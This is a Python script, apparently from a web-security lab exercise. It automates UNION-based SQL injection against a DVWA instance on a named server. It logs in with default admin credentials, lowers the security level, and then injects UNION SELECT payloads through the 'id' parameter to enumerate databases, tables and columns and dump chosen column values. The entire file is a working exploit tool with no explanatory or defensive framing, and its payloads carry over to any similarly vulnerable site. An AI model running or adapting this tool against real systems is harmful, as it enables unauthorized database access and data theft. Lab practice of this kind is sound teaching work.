import requests
from utils import BeautifulSoup, get_form_return, render_menu

session = requests.Session()
headers = {"User-Agent": "Mozilla/5.0"}


def get_user_token(url) -> str:
    user_token = session.get("http://vps.flavioprofessor.com.br/dvwa/login.php")
    user_token = BeautifulSoup(user_token.text, "html.parser")
    user_token = user_token.find("input", {"name": "user_token"})

    return user_token.get("value")


def login():
    form_url = "http://vps.flavioprofessor.com.br/dvwa/login.php"
    payload = {
        "username": "admin",
        "password": "password",
        "user_token": get_user_token(form_url),
        "Login": "Login",
    }

    response = session.post(form_url, data=payload, headers=headers)


def setting_difficulty():
    form_url = "http://vps.flavioprofessor.com.br/dvwa/security.php"
    payload = {
        "security": "low",
        "seclev_submit": "submit",
        "user_token": get_user_token(form_url),
    }

    response = session.post(form_url, data=payload, headers=headers)


def get_allowed_databases() -> list:
    form_url = "http://vps.flavioprofessor.com.br/dvwa/vulnerabilities/sqli/"
    query_to_inject = "' UNION SELECT 1, SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA#"
    payload = {"id": query_to_inject, "Submit": "Submit"}

    response = session.get(form_url, params=payload, headers=headers)
    allowed_databases = get_form_return(response.text, surname="name")

    return allowed_databases


def get_tables_from_database(database) -> list:
    form_url = "http://vps.flavioprofessor.com.br/dvwa/vulnerabilities/sqli/"
    query_to_inject = f"' UNION SELECT 1, TABLE_NAME FROM information_schema.tables where table_schema = '{database}'#"
    payload = {"id": query_to_inject, "Submit": "Submit"}

    response = session.get(form_url, params=payload, headers=headers)
    tables = get_form_return(response.text, surname="name")

    return tables


def get_columns_of_table(database, table) -> list:
    form_url = "http://vps.flavioprofessor.com.br/dvwa/vulnerabilities/sqli/"
    query_to_inject = f"' UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA = '{database}' AND TABLE_NAME = '{table}'#"
    payload = {"id": query_to_inject, "Submit": "Submit"}

    response = session.get(form_url, params=payload, headers=headers)
    columns = get_form_return(response.text, surname="name")

    return columns


def get_value_from_table(database, table, *args) -> list:
    form_url = "http://vps.flavioprofessor.com.br/dvwa/vulnerabilities/sqli/"
    if len(args) == 1:
        args = [1, args[0]]

    query_to_inject = f"' UNION SELECT {args[0]}, {args[1]} from {database}.{table}#"
    payload = {"id": query_to_inject, "Submit": "Submit"}

    response = session.get(form_url, params=payload, headers=headers)

    if args[0] == 1:
        kwargs = {"surname": args[1]}
    else:
        kwargs = {"first_name": args[0], "surname": args[1]}

    values = get_form_return(response.text, **kwargs)

    return values


if __name__ == "__main__":
    login()
    setting_difficulty()

    while True:
        databases = get_allowed_databases()
        choosed_db = render_menu(
            "Find this databases: ",
            [db["name"] for db in databases],
            input_message="Choose a database to explore: ",
        )

        tables = get_tables_from_database(choosed_db)
        choosed_table = render_menu(
            f"Find this tables on {choosed_db}: ",
            [table["name"] for table in tables],
            input_message=f"Choose a table on {choosed_db}: ",
        )

        columns = get_columns_of_table(choosed_db, choosed_table)
        values = get_value_from_table(choosed_db, choosed_table, columns[0]["name"])

        if len(columns) > 1:
            first_field = render_menu(
                f"Find this columns on {choosed_db}.{choosed_table}: ",
                [column["name"] for column in columns],
                input_message=f"Choose a first column to get value: ",
            )
            values = get_value_from_table(choosed_db, choosed_table, first_field)

            has_more_field = render_menu(
                "You can search up to two fields simultaneously: ",
                ["s", "n"],
                input_message="Want to bring one more field? ",
            )
            if "s" in has_more_field:
                second_field = render_menu(
                    f"columns on {choosed_db}.{choosed_table}: ",
                    [column["name"] for column in columns],
                    input_message=f"Choose a first column to get value: ",
                )
                values = get_value_from_table(
                    choosed_db, choosed_table, first_field, second_field
                )

        render_menu(f"Find this Values on {choosed_table}: ", values)

        input("\nPress any key to continue.. ")

        explore_again = render_menu(
            "You can explore again", ["s", "n"], input_message="Want to continue? "
        )
        if "n" in explore_again:
            render_menu("Good Bye!", [])
            break
